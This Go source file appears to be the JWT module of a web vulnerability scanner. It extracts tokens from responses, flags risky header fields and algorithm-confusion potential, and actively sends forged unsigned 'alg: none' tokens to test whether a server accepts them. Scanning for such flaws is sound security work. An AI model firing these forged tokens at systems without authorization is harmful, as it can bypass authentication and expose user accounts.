package jwt

import (
	"encoding/base64"
	"fmt"
	"io"
	"net/http"
	"regexp"
	"strings"

	"github.com/yupiyy/bhyakugan/internal/core"
)

// JWT Regex (Header.Payload.Signature)
var jwtRegex = regexp.MustCompile(`eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]*`)

// Scan searches for JWTs and tests them
func Scan(url string, client *http.Client, body string, headers http.Header, onFound func(core.Finding)) {
	seenTokens := make(map[string]bool)

	// 1. Check in Body
	matches := jwtRegex.FindAllString(body, -1)
	for _, token := range matches {
		if !seenTokens[token] {
			analyzeToken(token, url, "Response Body", client, onFound)
			seenTokens[token] = true
		}
	}

	// 2. Check in Headers (Set-Cookie, etc)
	for name, values := range headers {
		for _, val := range values {
			matches := jwtRegex.FindAllString(val, -1)
			for _, token := range matches {
				if !seenTokens[token] {
					analyzeToken(token, url, fmt.Sprintf("Header: %s", name), client, onFound)
					seenTokens[token] = true
				}
			}
		}
	}
}

func analyzeToken(token, url, source string, client *http.Client, onFound func(core.Finding)) {
	parts := strings.Split(token, ".")
	if len(parts) < 2 {
		return
	}

	headerJSON, _ := decodePart(parts[0])
	payloadJSON, _ := decodePart(parts[1])

	fmt.Printf("[+] FOUND JWT at %s (%s)\n", url, source)

	// Report Discovery
	onFound(core.Finding{
		Type:     "JWT Discovered",
		Target:   url,
		Detail:   fmt.Sprintf("Header: %s | Payload: %s", headerJSON, payloadJSON),
		Severity: "Info",
	})

	// Check Header for interesting fields
	if strings.Contains(headerJSON, "\"kid\"") {
		onFound(core.Finding{Type: "JWT Header Info", Target: url, Detail: "KID header found (Potential Path Traversal/SQLi)", Severity: "Low"})
	}
	if strings.Contains(headerJSON, "\"jku\"") {
		onFound(core.Finding{Type: "JWT Header Info", Target: url, Detail: "JKU header found (Potential SSRF/Key Injection)", Severity: "Medium"})
	}
	
	// Check for RS256 (Algorithm Confusion Potential)
	if strings.Contains(headerJSON, "\"alg\":\"RS256\"") || strings.Contains(headerJSON, "\"alg\": \"RS256\"") {
		onFound(core.Finding{
			Type:     "JWT Potential Confusion",
			Target:   url,
			Detail:   "RS256 Algorithm used. Potential for RS256-to-HS256 Confusion Attack.",
			Severity: "Low",
		})
	}

	// Check for Sensitive Data in Payload
	sensitiveKeywords := []string{"admin", "role", "root", "password", "email", "secret", "user_id"}
	for _, kw := range sensitiveKeywords {
		if strings.Contains(strings.ToLower(payloadJSON), kw) {
			onFound(core.Finding{
				Type:     "JWT Sensitive Info",
				Target:   url,
				Detail:   fmt.Sprintf("Keyword '%s' found in payload: %s", kw, payloadJSON),
				Severity: "Low",
			})
			break
		}
	}

	// Check for 'None' Algorithm Vulnerability (Active Check with Variants)
	checkNoneAlgorithm(token, url, client, onFound)
}

func decodePart(payload string) (string, error) {
	// Clean and Pad
	payload = strings.TrimSpace(payload)
	if l := len(payload) % 4; l > 0 {
		payload += strings.Repeat("=", 4-l)
	}
	decoded, err := base64.URLEncoding.DecodeString(payload)
	if err != nil {
		// Try RawURLEncoding if standard fails
		decoded, err = base64.RawURLEncoding.DecodeString(payload)
		if err != nil {
			return "", err
		}
	}
	return string(decoded), nil
}

func checkNoneAlgorithm(originalToken, url string, client *http.Client, onFound func(core.Finding)) {
	parts := strings.Split(originalToken, ".")
	if len(parts) < 2 {
		return
	}

	// 1. Get Baseline (No Token)
	// We need to know what the server returns when NO token is present.
	// If it returns 200 OK (public page), sending a "None" token and getting 200 OK proves nothing.
	reqBase, _ := http.NewRequest("GET", url, nil)
	respBase, errBase := client.Do(reqBase)
	baseBody := ""
	if errBase == nil {
		defer respBase.Body.Close()
		b, _ := io.ReadAll(respBase.Body)
		baseBody = string(b)
	}

	variants := []string{"none", "None", "NONE", "nOnE"}
	
	for _, v := range variants {
		// Create Header: {"alg":"v","typ":"JWT"}
		header := fmt.Sprintf(`{"alg":"%s","typ":"JWT"}`, v)
		noneHeader := base64.RawURLEncoding.EncodeToString([]byte(header))
		
		// Token without signature (Header.Payload.)
		noneToken := noneHeader + "." + parts[1] + "."

		req, _ := http.NewRequest("GET", url, nil)
		req.Header.Set("Authorization", "Bearer " + noneToken)
		
		resp, err := client.Do(req)
		if err == nil {
			defer resp.Body.Close()
			// Heuristic: If 200 OK and response contains evidence of successful auth
			if resp.StatusCode == 200 {
				body, _ := io.ReadAll(resp.Body)
				bodyStr := string(body)
				
				// FP Check: Must be different from baseline
				// If the page is public, baseline is 200 OK. "None" token also getting 200 OK is normal (ignored).
				// We need evidence that the token CHANGED the state (e.g. from "Login" to "Welcome User").
				
				if bodyStr == baseBody {
					continue // Token was likely ignored
				}

				// Look for common success indicators in JSON or Auth messages
				if strings.Contains(bodyStr, "admin") || strings.Contains(bodyStr, "authenticated") || strings.Contains(bodyStr, "success") {
					fmt.Printf("[!] POSITIVE MATCH: JWT None Algorithm (%s) at %s\n", v, url)
					onFound(core.Finding{
						Type:     "JWT None Algorithm",
						Target:   url,
						Detail:   fmt.Sprintf("Server accepted 'alg':'%s'. Response differs from baseline.", v),
						Severity: "Critical",
					})
					return // Found one, that's enough
				}
			}
		}
	}
}
